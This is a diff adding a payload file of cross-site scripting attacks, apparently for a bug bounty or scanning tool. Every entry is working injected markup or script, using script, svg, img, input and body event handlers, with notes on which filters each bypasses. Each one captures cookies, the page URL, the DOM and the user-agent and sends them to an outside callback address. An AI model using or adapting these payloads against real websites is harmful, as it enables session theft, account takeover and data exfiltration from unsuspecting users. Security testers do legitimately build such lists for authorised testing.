@@ -1,0 +1,21 @@
+# XSS exfiltration payloads - capture DOM, cookies, URL, user-agent
+# {{CALLBACK}} is replaced with callback_url/correlation_id at injection time
+# These payloads send metadata as JSON for rich bug bounty reporting
+
+# Full metadata capture via fetch POST
+<script>(function(){var d=document,l=location;fetch('{{CALLBACK}}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url:l.href,cookies:d.cookie,dom:d.body.innerHTML.substring(0,50000),ua:navigator.userAgent,ref:d.referrer,ts:Date.now()})})})();</script>
+
+# SVG with fetch POST (bypasses some filters)
+<svg onload="(function(){var d=document,l=location;fetch('{{CALLBACK}}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url:l.href,cookies:d.cookie,dom:d.body.innerHTML.substring(0,50000),ua:navigator.userAgent})})})()">
+
+# Image fallback (no CORS issues, query string exfil)
+<img src=x onerror="new Image().src='{{CALLBACK}}?c='+encodeURIComponent(document.cookie)+'&u='+encodeURIComponent(location.href)">
+
+# Compact event handler with autofocus
+<input onfocus="fetch('{{CALLBACK}}',{method:'POST',body:JSON.stringify({url:location.href,cookies:document.cookie,dom:document.body.innerHTML.slice(0,10000)})})" autofocus>
+
+# Script tag with query string (works when inline scripts blocked)
+<script>new Image().src='{{CALLBACK}}?c='+encodeURIComponent(document.cookie)+'&u='+encodeURIComponent(location.href)+'&ua='+encodeURIComponent(navigator.userAgent)</script>
+
+# Body onload (delayed execution context)
+<body onload="fetch('{{CALLBACK}}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url:location.href,cookies:document.cookie,dom:document.body.innerHTML.substring(0,50000),ua:navigator.userAgent})})">
